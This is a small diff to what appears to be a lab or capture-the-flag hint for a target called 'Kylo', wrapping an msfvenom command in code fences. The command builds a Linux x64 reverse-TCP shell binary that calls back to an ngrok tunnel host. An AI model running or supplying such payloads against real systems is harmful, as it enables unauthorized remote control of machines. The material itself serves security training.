@@ -21,7 +21,9 @@ Stuck?
   
   msfvenom (which is installed on Kali linux) is an app that lets you craft a binary for any target OS/architecture. For Kylo, be sure to target x64 architecture and the linux platform. 
   
+  ```
   msfvenom --platform linux -p linux/x64/shell/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19358 -b "\x00" -f elf > ~/Desktop/runme
+  ```
 
 </details>
 
